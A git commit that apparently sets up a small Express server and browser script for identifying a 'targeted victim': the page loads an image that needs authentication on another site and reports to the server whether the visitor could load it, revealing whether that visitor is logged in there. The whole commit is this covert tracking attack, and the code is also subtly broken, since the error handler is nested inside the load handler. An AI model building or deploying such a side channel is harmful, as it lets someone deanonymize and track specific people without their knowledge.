c3f0fb426ae55d47102b0a8734ab8646b36ac214
pattypattie <pat2baker2street1@gmail.com>
2022-02-25 10:09:15 +0000

    initial commit

---
+++ app.js
@@ -0,0 +1,29 @@
+const express = require('express')
+const app = express()
+const port = 3000
+// const path = require('path')
+
+var bodyParser = require('body-parser')
+
+app.use(express.static(__dirname));
+app.use(express.static('img'))
+app.use(bodyParser.urlencoded({extended: false}))
+app.use(bodyParser.json())
+
+app.get('/', (req, res) => {
+  res.sendFile(__dirname + '/index.html');
+})
+
+app.listen(port, () => {
+  console.log(`Listening on port ${port}`)
+})
+
+app.post('/visited', function (req, res) {
+console.log("The targeted victim visited the website!")
+return res.end('done')
+})
+
+app.post('/notvisited', function (req, res) {
+console.log("Someone else visited the website!")
+return res.end('done')
+})
---
+++ index.js
@@ -0,0 +1,14 @@
+    var img = document.getElementById("cat-image");
+    img.src = "https://www.linkpicture.com/q/catphoto.jpeg"; //link to image that requires authentication to open
+    img.onload = function() {
+        var xhr = new window.XMLHttpRequest()
+         xhr.open('POST', '/visited', true)
+         xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8')
+         xhr.send(null)
+      img.onerror = function() {
+        var xhr2 = new window.XMLHttpRequest()
+         xhr2.open('POST', '/notvisited', true)
+         xhr2.setRequestHeader('Content-Type', 'application/json;charset=UTF-8')
+         xhr2.send(null)
+     } 
+    }
